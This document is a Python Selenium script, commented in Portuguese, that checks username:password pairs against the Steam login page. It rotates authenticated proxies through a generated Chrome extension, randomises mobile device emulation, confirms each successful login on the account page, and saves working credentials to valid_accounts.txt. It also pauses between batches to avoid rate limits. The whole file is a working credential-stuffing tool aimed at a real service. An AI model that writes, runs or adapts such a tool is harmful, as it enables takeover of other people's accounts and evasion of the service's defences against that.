import os
import zipfile
import json
import tempfile
from selenium import webdriver
from selenium.webdriver import Firefox, FirefoxOptions
from webdriver_manager.firefox import GeckoDriverManager
from selenium.webdriver.common.proxy import Proxy, ProxyType

from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException
from webdriver_manager.chrome import ChromeDriverManager

import time
import random
from itertools import cycle

LOGIN_URL = "https://store.steampowered.com/login/?redir=%3Fl%3Dportuguese&redir_ssl=1"

def _build_proxy_auth_extension(proxy: str, scheme: str = "http") -> str:
    """Gera (em tempo-real) uma extensão do Chrome que define proxy + autenticação."""
    creds, host_port = proxy.split("@")
    username, password = creds.split(":", 1)
    host, port = host_port.split(":", 1)

    manifest = {
        "version": "1.0.0",
        "manifest_version": 2,
        "name": "ProxyAuth",
        "permissions": [
            "proxy",
            "tabs",
            "unlimitedStorage",
            "storage",
            "<all_urls>",
            "webRequest",
            "webRequestBlocking"
        ],
        "background": {
            "scripts": ["background.js"]
        }
    }

    background = f"""
var config = {{
    mode: "fixed_servers",
    rules: {{
        singleProxy: {{
            scheme: "{scheme}",
            host: "{host}",
            port: parseInt({port})
        }},
        bypassList: ["localhost", "127.0.0.1"]
    }}
}};
chrome.proxy.settings.set({{value: config, scope: "regular"}}, function() {{}});
chrome.webRequest.onAuthRequired.addListener(
  function(details) {{
    return {{
      authCredentials: {{username: "{username}", password: "{password}"}}
    }};
  }},
  {{urls: ["<all_urls>"]}},
  ['blocking']
);
"""

    plugin_file = os.path.join(tempfile.gettempdir(), "proxy_auth_plugin.zip")
    with zipfile.ZipFile(plugin_file, 'w') as zp:
        zp.writestr("manifest.json", json.dumps(manifest))
        zp.writestr("background.js", background)
    return plugin_file


def create_driver(proxy: str, browser: str = "chrome"):
    """Cria WebDriver (Chrome ou Firefox) com proxy autenticado."""
    if browser.lower() == "firefox":
        ff_opts = FirefoxOptions()
        ff_opts.add_argument("-private")
        ff_opts.add_argument("--width=420")
        ff_opts.add_argument("--height=850")
        ff_opts.set_preference("general.useragent.override",
                                "Mozilla/5.0 (Linux; Android 10; Pixel 2) AppleWebKit/537.36 "
                                "(KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36")

        proxy_settings = Proxy()
        proxy_settings.proxy_type = ProxyType.MANUAL
        proxy_settings.http_proxy = proxy
        proxy_settings.ssl_proxy = proxy

        profile = webdriver.FirefoxProfile()
        host_port = proxy.split("@")[-1]
        host, port = host_port.split(":")
        profile.set_preference("network.proxy.type", 1)
        profile.set_preference("network.proxy.http", host)
        profile.set_preference("network.proxy.http_port", int(port))
        profile.set_preference("network.proxy.ssl", host)
        profile.set_preference("network.proxy.ssl_port", int(port))
        profile.set_preference("network.proxy.no_proxies_on", "")
        profile.update_preferences()
        ff_opts.profile = profile

        service = Service(executable_path=GeckoDriverManager().install(), log_path=os.devnull)
        return Firefox(service=service, options=ff_opts)

    # ---------- Chrome padrão ----------
    chrome_opts = Options()
    chrome_opts.add_argument("--incognito")
    chrome_opts.add_argument("--disable-gpu")
    chrome_opts.add_argument("--no-sandbox")
    chrome_opts.add_argument("--disable-dev-shm-usage")
    # Emulação de dispositivo móvel aleatória
    mobile_emulation = {"deviceName": random.choice(["Pixel 2", "iPhone X", "Galaxy S5"])}
    chrome_opts.add_experimental_option("mobileEmulation", mobile_emulation)
    # Suprime logs extras do Chrome/Chromedriver
    chrome_opts.add_argument("--log-level=3")  # fatal
    chrome_opts.add_experimental_option('excludeSwitches', ['enable-logging'])

    proxy_ext_path = _build_proxy_auth_extension(proxy)
    chrome_opts.add_extension(proxy_ext_path)

    service = Service(ChromeDriverManager().install(), log_path=os.devnull)
    return webdriver.Chrome(service=service, options=chrome_opts)


def process_account(driver, username: str, password: str):
    wait = WebDriverWait(driver, 15)
    driver.get(LOGIN_URL)

    # Preenche usuário
    username_field = wait.until(
        EC.element_to_be_clickable(
            (By.CSS_SELECTOR, 'input._2GBWeup5cttgbTw8FM3tfx[type="text"]')
        )
    )
    username_field.clear()
    username_field.send_keys(username)

    # Preenche senha
    password_field = wait.until(
        EC.element_to_be_clickable(
            (By.CSS_SELECTOR, 'input._2GBWeup5cttgbTw8FM3tfx[type="password"]')
        )
    )
    password_field.clear()
    password_field.send_keys(password)

    # Clica no botão de login
    login_btn = wait.until(
        EC.element_to_be_clickable(
            (By.CSS_SELECTOR, 'button.DjSvCZoKKfoNSmarsEcTS[type="submit"]')
        )
    )
    login_btn.click()
    print("Aguardando 3 segundos...")
    time.sleep(3)
    driver.set_page_load_timeout(8)

    # -------- Validação via página de conta --------
    success = False
    try:
        driver.get("https://store.steampowered.com/account/")
        header = WebDriverWait(driver, 5).until(
            EC.presence_of_element_located(
                (By.CSS_SELECTOR, 'h2.pageheader.youraccount_pageheader')
            )
        )
        if username.lower() in header.text.lower():
            success = True
    except TimeoutException:
        success = False
    

    # -------- Gravação de resultado --------
    if success:
        print("Login confirmado — conta válida.")
        with open("valid_accounts.txt", "a", encoding="utf-8") as f:
            f.write(f"{username}:{password}\n")
    else:
        print("Conta inválida (não confirmou login).")
        with open("invalid_accounts.txt", "a", encoding="utf-8") as f:
            f.write(f"{username}:{password}\n")


def main():
    with open("accounts.txt", "r", encoding="utf-8") as file:
        accounts = [line.strip() for line in file if ":" in line]

    with open("proxies.txt", "r", encoding="utf-8") as f:
        proxies = [line.strip() for line in f if line.strip()]
    if not proxies:
        raise RuntimeError("proxies.txt está vazio!")
    proxy_cycle = cycle(proxies)

    for idx, acc in enumerate(accounts, 1):
        proxy = next(proxy_cycle)
        user, pwd = acc.split(":", 1)
        print(f"\nConta: {user}")

        print("Abrindo navegador...")
        driver = create_driver(proxy)
        try:
            process_account(driver, user, pwd)
        finally:
            driver.quit()

        # Rate-limit após cada 3 tentativas
        if idx % 3 == 0:
            print("Rate limit atingido — aguardando 2 minutos...")
            time.sleep(120)


if __name__ == "__main__":
    main()
